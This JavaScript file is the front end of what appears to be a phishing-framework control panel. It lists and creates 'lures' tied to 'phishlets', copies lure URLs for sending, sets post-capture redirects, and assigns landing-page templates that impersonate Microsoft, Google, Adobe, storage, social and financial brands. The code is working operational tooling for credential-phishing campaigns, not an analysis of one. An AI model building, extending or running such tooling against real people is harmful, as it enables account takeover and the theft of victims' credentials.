    startAutoRefresh();
    
    // Close detail panel on overlay click
    document.getElementById('detailOverlay')?.addEventListener('click', (e) => {
        if (e.target === e.currentTarget) closeDetailPanel();
    });
});

// Keyboard shortcuts
document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
        closeDetailPanel();
    }
});

// ============================================================
// Landing Pages Module
// ============================================================

let landingPagesData = [];
let selectedTemplate = null;
let currentCategory = 'all';

// Landing Pages API Functions
const LandingPagesAPI = {
    async getTemplates() {
        try {
            const response = await fetch('/api/landing-pages', {
                headers: { 'Authorization': getAuthToken() }
            });
            if (!response.ok) throw new Error('Failed to load templates');
            return await response.json();
        } catch (error) {
            console.error('Error loading landing pages:', error);
            return [];
        }
    },
    
    async assignToLure(lureIndex, templateId, config) {
        try {
            const response = await fetch('/api/lures/landing-page', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': getAuthToken()
                },
                body: JSON.stringify({
                    lure_index: parseInt(lureIndex),
                    template_id: templateId,
                    landing_config: config
                })
            });
            return await response.json();
        } catch (error) {
            console.error('Error assigning landing page:', error);
            throw error;
        }
    },
    
    async getLures() {
        try {
            const response = await fetch('/api/lures', {
                headers: { 'Authorization': getAuthToken() }
            });
            if (!response.ok) throw new Error('Failed to load lures');
            return await response.json();
        } catch (error) {
            console.error('Error loading lures:', error);
            return [];
        }
    }
};

// Load and render landing pages
async function loadLandingPages() {
    const grid = document.getElementById('landingPagesGrid');
    if (!grid) return;
    
    grid.innerHTML = `
        <div class="loading-placeholder">
            <i class="ri-loader-4-line spinning"></i>
            <span>Loading templates...</span>
        </div>
    `;
    
    try {
        landingPagesData = await LandingPagesAPI.getTemplates();
        renderLandingPages();
    } catch (error) {
        grid.innerHTML = `
            <div class="loading-placeholder">
                <i class="ri-error-warning-line" style="color: var(--danger);"></i>
                <span>Failed to load templates</span>
            </div>
        `;
    }
}

// Render landing pages grid
function renderLandingPages() {
    const grid = document.getElementById('landingPagesGrid');
    if (!grid) return;
    
    let templates = landingPagesData;
    
    // Filter by category
    if (currentCategory !== 'all') {
        templates = templates.filter(t => t.category === currentCategory);
    }
    
    if (templates.length === 0) {
        grid.innerHTML = `
            <div class="loading-placeholder">
                <i class="ri-inbox-line"></i>
                <span>No templates found in this category</span>
            </div>
        `;
        return;
    }
    
    grid.innerHTML = templates.map(template => `
        <div class="template-card" data-template-id="${template.id}" data-category="${template.category}">
            <div class="template-preview" style="background: ${getCategoryColor(template.category)};">
                <div class="template-icon">
                    <i class="ri-${getCategoryIcon(template.category)}"></i>
                </div>
            </div>
            <div class="template-info">
                <div class="template-category">${template.category}</div>
                <div class="template-name">${template.name}</div>
                <div class="template-desc">${template.description}</div>
                <div class="template-params-count">
                    <i class="ri-settings-3-line"></i>
                    ${template.params ? template.params.length : 0} parameters
                </div>
            </div>
        </div>
    `).join('');
    
    // Add click handlers
    document.querySelectorAll('.template-card').forEach(card => {
        card.addEventListener('click', () => {
            const templateId = card.dataset.templateId;
            const category = card.dataset.category;
            openTemplatePreview(`${category}/${templateId}`);
        });
    });
}

// Get category color
function getCategoryColor(category) {
    const colors = {
        microsoft: 'linear-gradient(135deg, #0078d4, #106ebe)',
        google: 'linear-gradient(135deg, #4285f4, #34a853)',
        adobe: 'linear-gradient(135deg, #ff0000, #ff6b6b)',
        storage: 'linear-gradient(135deg, #0061ff, #00c6ff)',
        social: 'linear-gradient(135deg, #1da1f2, #0a66c2)',
        financial: 'linear-gradient(135deg, #0b4f8c, #28a745)'
    };
    return colors[category] || 'linear-gradient(135deg, #667eea, #764ba2)';
}

// Get category icon
function getCategoryIcon(category) {
    const icons = {
        microsoft: 'windows-fill',
        google: 'google-fill',
        adobe: 'chrome-fill',
        storage: 'hard-drive-2-fill',
        social: 'share-fill',
        financial: 'bank-fill'
    };
    return icons[category] || 'file-list-3-line';
}

// Open template preview modal
async function openTemplatePreview(templateId) {
    const modal = document.getElementById('templatePreviewModal');
    const iframe = document.getElementById('templatePreviewFrame');
    const nameEl = document.getElementById('previewTemplateName');
    const descEl = document.getElementById('previewTemplateDesc');
    const paramsEl = document.getElementById('previewTemplateParams');
    
    const template = landingPagesData.find(t => 
        `${t.category}/${t.id}` === templateId
    );
    
    if (!template) return;
    
    selectedTemplate = template;
    
    nameEl.textContent = template.name;
    descEl.textContent = template.description;
    
    // Build params form
    if (template.params && template.params.length > 0) {
        paramsEl.innerHTML = template.params.map(param => `
            <div class="param-field">
                <label>${param.label}</label>
                <input type="${param.type === 'email' ? 'email' : 'text'}" 
                       class="param-input" 
                       data-param-id="${param.id}"
                       placeholder="${param.placeholder || ''}"
                       value="${param.default || ''}">
            </div>
        `).join('');
    } else {
        paramsEl.innerHTML = '<p class="text-secondary">No parameters required for this template</p>';
    }
    
    // Load preview
    iframe.src = `/api/landing-pages/preview?id=${templateId}`;
    
    modal.classList.add('active');
}

// Close preview modal
function closePreviewModal() {
    const modal = document.getElementById('templatePreviewModal');
    const iframe = document.getElementById('templatePreviewFrame');
    modal.classList.remove('active');
    iframe.src = '';
    selectedTemplate = null;
}

// Open assign to lure modal
async function openAssignModal() {
    if (!selectedTemplate) return;
    
    const modal = document.getElementById('assignToLureModal');
    const lureSelect = document.getElementById('lureSelect');
    const paramsForm = document.getElementById('landingPageParamsForm');
    
    // Load lures
    try {
        const lures = await LandingPagesAPI.getLures();
        lureSelect.innerHTML = lures.map((lure, index) => 
            `<option value="${index}">Lure ${index} - ${lure.phishlet} (${lure.path})</option>`
        ).join('');
    } catch (error) {
        lureSelect.innerHTML = '<option value="">Failed to load lures</option>';
    }
    
    // Build params form
    if (selectedTemplate.params && selectedTemplate.params.length > 0) {
        paramsForm.innerHTML = selectedTemplate.params.map(param => `
            <div class="form-group">
                <label>${param.label}</label>
                <input type="${param.type === 'email' ? 'email' : 'text'}" 
                       class="form-control assign-param" 
                       data-param-id="${param.id}"
                       placeholder="${param.placeholder || ''}"
                       value="${param.default || ''}">
            </div>
        `).join('');
    } else {
        paramsForm.innerHTML = '';
    }
    
    modal.classList.add('active');
}

// Close assign modal
function closeAssignModal() {
    const modal = document.getElementById('assignToLureModal');
    modal.classList.remove('active');
}

// Assign landing page to lure
async function assignLandingPageToLure() {
    const lureSelect = document.getElementById('lureSelect');
    const lureIndex = lureSelect.value;
    
    if (!lureIndex || !selectedTemplate) {
        Toast.error('Please select a lure and template');
        return;
    }
    
    const templateId = `${selectedTemplate.category}/${selectedTemplate.id}`;
    
    // Collect parameters
    const config = {};
    document.querySelectorAll('.assign-param').forEach(input => {
        config[input.dataset.paramId] = input.value;
    });
    
    try {
        const result = await LandingPagesAPI.assignToLure(lureIndex, templateId, config);
        Toast.success('Landing page assigned successfully');
        closeAssignModal();
        closePreviewModal();
    } catch (error) {
        Toast.error('Failed to assign landing page');
    }
}

// Initialize landing pages tab
document.addEventListener('DOMContentLoaded', () => {
    // Category filter buttons
    document.querySelectorAll('.category-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            document.querySelectorAll('.category-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            currentCategory = btn.dataset.category;
            renderLandingPages();
        });
    });
    
    // Refresh button
    document.getElementById('refreshLandingPagesBtn')?.addEventListener('click', loadLandingPages);
    
    // Modal close buttons
    document.getElementById('closePreviewModal')?.addEventListener('click', closePreviewModal);
    document.getElementById('closeAssignModal')?.addEventListener('click', closeAssignModal);
    document.getElementById('cancelAssignBtn')?.addEventListener('click', closeAssignModal);
    
    // Use template button
    document.getElementById('useTemplateBtn')?.addEventListener('click', openAssignModal);
    
    // Confirm assign button
    document.getElementById('confirmAssignBtn')?.addEventListener('click', assignLandingPageToLure);
    
    // Load landing pages when tab is clicked
    document.querySelectorAll('.nav-btn[data-tab="landing-pages"]').forEach(btn => {
        btn.addEventListener('click', () => {
            loadLandingPages();
        });
    });
    
    // Load lures when settings tab is clicked
    document.querySelectorAll('.nav-btn[data-tab="settings"]').forEach(btn => {
        btn.addEventListener('click', () => {
            loadLuresList();
        });
    });
    
    // Create lure form submit
    document.getElementById('createLureForm')?.addEventListener('submit', handleCreateLure);
});

// ============================================================
// Lure Management Functions
// ============================================================

let currentLures = [];

async function loadLuresList() {
    try {
        const token = getAuthToken();
        const response = await fetch('/api/lures', {
            headers: { 'Authorization': token }
        });
        
        if (!response.ok) throw new Error('Failed to load lures');
        
        currentLures = await response.json();
        renderLuresList(currentLures);
    } catch (error) {
        console.error('Error loading lures:', error);
        document.getElementById('luresList').innerHTML = `
            <p class="text-muted">Failed to load lures. <button class="btn btn-sm btn-secondary" onclick="loadLuresList()">Retry</button></p>
        `;
    }
}

function renderLuresList(lures) {
    const container = document.getElementById('luresList');
    
    if (lures.length === 0) {
        container.innerHTML = `<p class="text-muted">No lures created yet. Click "Create Lure" to add one.</p>`;
        return;
    }
    
    container.innerHTML = lures.map((lure, index) => `
        <div class="lure-item">
            <div class="lure-info">
                <div class="lure-path">
                    ${lure.phishlet}
                    ${lure.use_external_redirect 
                        ? `<span class="lure-redirect-status enabled"><i class="ri-external-link-line"></i> External Redirect</span>` 
                        : `<span class="lure-redirect-status disabled"><i class="ri-arrow-right-line"></i> Default Redirect</span>`}
                </div>
                <div class="lure-details">
                    ${lure.hostname}${lure.path} • ${lure.info || 'No description'}
                    ${lure.use_external_redirect && lure.external_redirect_url 
                        ? `<br><small>→ ${lure.external_redirect_url}</small>` 
                        : ''}
                </div>
            </div>
            <div class="lure-actions">
                <button class="lure-btn lure-btn-secondary" onclick="openEditLureRedirectModal(${index})" title="Edit External Redirect">
                    <i class="ri-edit-line"></i>
                    Redirect
                </button>
                <button class="lure-btn lure-btn-secondary" onclick="copyLureUrl(${index})" title="Copy Lure URL">
                    <i class="ri-link"></i>
                </button>
                <button class="lure-btn lure-btn-danger" onclick="deleteLure(${index})" title="Delete Lure">
                    <i class="ri-delete-bin-line"></i>
                </button>
            </div>
        </div>
    `).join('');
}

async function loadPhishletsForSelect() {
    try {
        const token = getAuthToken();
        const response = await fetch('/api/phishlets', {
            headers: { 'Authorization': token }
        });
        
        if (!response.ok) throw new Error('Failed to load phishlets');
        
        const phishlets = await response.json();
        const select = document.getElementById('lurePhishlet');
        
        // Keep the first option
        select.innerHTML = '<option value="">Select a phishlet...</option>';
        
        phishlets.forEach(p => {
            if (p.enabled) {
                select.innerHTML += `<option value="${p.name}">${p.name}</option>`;
            }
        });
    } catch (error) {
        console.error('Error loading phishlets:', error);
    }
}

function openCreateLureModal() {
    document.getElementById('createLureForm').reset();
    document.getElementById('editLureIndex').value = '';
    document.getElementById('createLureModalTitle').textContent = 'Create New Lure';
    document.getElementById('createLureSubmitText').textContent = 'Create Lure';
    document.getElementById('externalRedirectUrlGroup').style.display = 'none';
    
    loadPhishletsForSelect();
    
    document.getElementById('createLureModal').classList.add('active');
}

function closeCreateLureModal() {
    document.getElementById('createLureModal').classList.remove('active');
}

function toggleExternalRedirect() {
    const checkbox = document.getElementById('useExternalRedirect');
    const urlGroup = document.getElementById('externalRedirectUrlGroup');
    
    urlGroup.style.display = checkbox.checked ? 'block' : 'none';
    
    if (checkbox.checked) {
        document.getElementById('externalRedirectUrl').setAttribute('required', 'required');
    } else {
        document.getElementById('externalRedirectUrl').removeAttribute('required');
    }
}

async function handleCreateLure(e) {
    e.preventDefault();
    
    const payload = {
        phishlet: document.getElementById('lurePhishlet').value,
        path: document.getElementById('lurePath').value,
        info: document.getElementById('lureInfo').value,
        redirect_url: '',
        redirector: '',
        post_redirector: '',
        use_external_redirect: document.getElementById('useExternalRedirect').checked,
        external_redirect_url: document.getElementById('externalRedirectUrl').value
    };
    
    if (!payload.phishlet) {
        Toast.error('Please select a phishlet');
        return;
    }
    
    if (payload.use_external_redirect && !payload.external_redirect_url) {
        Toast.error('Please enter an external redirect URL');
        return;
    }
    
    try {
        const token = getAuthToken();
        const response = await fetch('/api/lures/create', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': token
            },
            body: JSON.stringify(payload)
        });
        
        if (!response.ok) {
            const data = await response.json();
            throw new Error(data.error || 'Failed to create lure');
        }
        
        Toast.success('Lure created successfully');
        closeCreateLureModal();
        loadLuresList();
    } catch (error) {
        console.error('Error creating lure:', error);
        Toast.error(error.message);
    }
}

function openEditLureRedirectModal(index) {
    const lure = currentLures[index];
    if (!lure) return;
    
    document.getElementById('editRedirectLureIndex').value = index;
    document.getElementById('editUseExternalRedirect').checked = lure.use_external_redirect || false;
    document.getElementById('editExternalRedirectUrl').value = lure.external_redirect_url || '';
    
    const urlGroup = document.getElementById('editExternalRedirectUrlGroup');
    urlGroup.style.display = lure.use_external_redirect ? 'block' : 'none';
    
    if (lure.use_external_redirect) {
        document.getElementById('editExternalRedirectUrl').setAttribute('required', 'required');
    } else {
        document.getElementById('editExternalRedirectUrl').removeAttribute('required');
    }
    
    document.getElementById('editLureRedirectModal').classList.add('active');
}

function closeEditLureRedirectModal() {
    document.getElementById('editLureRedirectModal').classList.remove('active');
}

function toggleEditExternalRedirect() {
    const checkbox = document.getElementById('editUseExternalRedirect');
    const urlGroup = document.getElementById('editExternalRedirectUrlGroup');
    
    urlGroup.style.display = checkbox.checked ? 'block' : 'none';
    
    if (checkbox.checked) {
        document.getElementById('editExternalRedirectUrl').setAttribute('required', 'required');
    } else {
        document.getElementById('editExternalRedirectUrl').removeAttribute('required');
    }
}

async function saveLureExternalRedirect() {
    const index = parseInt(document.getElementById('editRedirectLureIndex').value);
    const useExternalRedirect = document.getElementById('editUseExternalRedirect').checked;
    const externalRedirectUrl = document.getElementById('editExternalRedirectUrl').value;
    
    if (useExternalRedirect && !externalRedirectUrl) {
        Toast.error('Please enter an external redirect URL');
        return;
    }
    
    try {
        const token = getAuthToken();
        const response = await fetch('/api/lures/external-redirect', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': token
            },
            body: JSON.stringify({
                index: index,
                use_external_redirect: useExternalRedirect,
                external_redirect_url: externalRedirectUrl
            })
        });
        
        if (!response.ok) {
            const data = await response.json();
            throw new Error(data.error || 'Failed to update redirect settings');
        }
        
        Toast.success('External redirect settings updated');
        closeEditLureRedirectModal();
        loadLuresList();
    } catch (error) {
        console.error('Error updating redirect settings:', error);
        Toast.error(error.message);
    }
}

async function copyLureUrl(index) {
    try {
        const token = getAuthToken();
        const response = await fetch(`/api/lures/get-url?id=${index}`, {
            headers: { 'Authorization': token }
        });
        
        if (!response.ok) throw new Error('Failed to get lure URL');
        
        const data = await response.json();
        
        if (navigator.clipboard && data.url) {
            await navigator.clipboard.writeText(data.url);
            Toast.success('Lure URL copied to clipboard');
        } else {
            throw new Error('Clipboard not available');
        }
    } catch (error) {
        console.error('Error copying lure URL:', error);
        Toast.error(error.message);
    }
}

async function deleteLure(index) {
    if (!confirm('Are you sure you want to delete this lure?')) {
        return;
    }
    
    try {
        const token = getAuthToken();
        const response = await fetch('/api/lures/delete', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': token
            },
            body: JSON.stringify({ index: index })
        });
        
        if (!response.ok) {
            const data = await response.json();
            throw new Error(data.error || 'Failed to delete lure');
        }
        
        Toast.success('Lure deleted successfully');
        loadLuresList();
    } catch (error) {
        console.error('Error deleting lure:', error);
        Toast.error(error.message);
    }
}
